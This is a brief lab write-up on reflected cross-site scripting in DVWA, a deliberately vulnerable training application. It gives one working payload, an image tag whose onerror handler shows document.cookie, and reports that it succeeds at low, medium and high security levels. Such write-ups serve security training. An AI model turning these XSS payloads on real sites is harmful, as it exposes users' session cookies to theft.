---
title: "Reflected Cross Site Scripting (XSS) - DVWA"
description: ""
summary: "Trigger an alert pop-up with cookie values using Reflected XSS."
date: 2022-08-17
draft: false
tags: ["writeups", "challenge", "DVWA", "Reflected XSS"]
---


### **Security level: low**

we have name field which is reflecting on page.

payload=`<img src=x onerror="alert(document.cookie)">`

It triggers an alert pop up with cookie value.


### **Security level: medium**

_payload of low level also works here: _

payload=`<img src=x onerror="alert(document.cookie)">`


### **Security level: high**

_payload of low level also works here: _

payload=`<img src=x onerror="alert(document.cookie)">`

Happy Hacking
